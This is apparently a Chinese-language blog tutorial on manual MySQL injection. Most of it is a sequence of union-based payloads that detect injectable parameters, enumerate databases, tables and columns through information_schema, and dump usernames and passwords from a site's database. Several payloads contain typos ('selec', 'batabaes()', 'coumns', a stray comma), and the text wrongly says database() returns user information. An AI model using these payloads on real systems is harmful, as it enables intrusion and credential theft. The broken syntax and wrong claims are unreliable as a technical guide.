mysql注入

发表于 2019-06-01 
在讲MySQL注入的之前，我们先来了解一下什么是sql。

1、什么是sql

SQL是一个通用的、功能强大的关系数据库语言，但其功能并不仅仅是
查询,它可以用来访问和操作数据库系统。SQL 语句用于取回和更新数
据库中的数据，同时，它也是一门标准的计算机语言。

2、什么是SQL注入

所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询
字符串，最终达到欺骗服务器执行恶意的SQL命令。简单来说，SQL注入就是一种通过
操作输入（可以是表单，可以是get请求，也可以是POST请求等）来插入或修改后台
SQL语句达到代码执行从而进行攻击的技术。

3、SQL注入产生的原因

其主要原因就是当网页程序员在编写代码的时候，没有对用户输入数据的合法性进行
严格的判断和过滤，从而导致应用程序存在该漏洞

4、攻击方法

对于MySQL的注入主要有以下两种方法：

（1）手工注入
（2）使用工具注入

好了在基本介绍了MySQL之后，我们来进行实验。

首先，我们要确定该网站是否存在SQL注入,同时也要确定注入是字符型还是数字型

1、常见的有如下：

    ？id=1    显示正常页面
    ？id=1'    显示错误页面

2、也可以是:

    ? id=1 and 1=1    页面显示正常，因为1=1是正确的
    ？id=1 and 1=2    页面显示错误，因为1=2本来就是错误的，所以页面也就返回错误

数字型：and 1=1 and 1=2 判断是否存在注入
字符型：' and '1'='1 ' and '1'='2
搜索型： 关键字%' and 1=1 and '%'='% 关键字%' and 1=2 and '%'='%

当我们基本上确定了网站存在注入的时候那么就可以进行下一步的操作了

获取字段

当我们确定了一个网站存在了基本的注入时，可以通过语句来获取字段

and 1=1 order by n    通过不断改变n的值以及观察页面的情况来确定字段数

比如说n在5的时候出错了，那就说明select的字段是4个

判断显示位

当我们得到n的值时，就可以用 union select来判断他的显示位

and 1=2 union select 1,2,3,4,5,....,n #

注释常常使用    --+、#、%23

一般数字会显示在页面的任何位置，如何判断它呢，和正常页面作比较，如果正常页面没有而他又有说明他就是你要找的数字。

查当前数据库

and 1=2 union select 1,2,3,SCHEMA_NAME from information_schema.schemata

and 1=2 union select 1,2,database()

当然databaes()也可以换其他的，如version()数据库的版本信息
而databaes()则是用户信息

获取数据库名
union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 0,1   #得到第一个库名

union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 1,1   #得到第二个库名

查表名

当我们确定了数据库时就要获取数据库的表名，所以下一步就要获取它的表名

and 1=2 union selec 1,2,3,table_name，5 from information_schema.tables where table_schema=batabaes()/*这里就是上面的数据库*/ limit 0,1

或者  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

查找所有表的语句：select table_name from information_schema.tables where table_schema='当前数据库'

查列名

我们用information_schema.columns可以获取表中的所有字段

and 1=2 union select 1,2,3,column_name,5,6,7 from information_schema.columns where table_name='表名或者表名的十六进制' limit 0,1

但是有的时候后台的代码可能仅用了使用where子句，那么这个时候就无法通过information_schema.coumns来得到列名了，这个时候只能够根据你自己多年的
黑客经验来进行猜解了。猜解的方法也是比较的简单，使用exists子句就可以进行猜解了。假设在我们已经知道了表名的情况下(当然猜解表名也使用通过exists子句来完成)

语句：id=1 and exists(select 猜测的列名 from users)
如果在users表中不存在就会报错或者不显示内容
如果存在机会返回结果，那就说明users表中存在列名

查字段内容

当我们得到表名和字段名后就可以dump数据库的所有信息了，比如，查询用户名，查询密码等等，当然我们还可以脱库，下载表中所有信息

and 1=2 union select 1,2,password from 表名    /*查询密码*/

and 1=2 union select 1,2,username from 表名    /*用户名*/

脱库

比如下载users的所有数据

and 1=2 union select 1,2,group_concat(username,password),4 from users(表名)

当然也可以得到其他的数据，不止用户名和密码。

以上就是一个sql注入的基本过程了，但是想要精通的活还需要不断的努力啊。
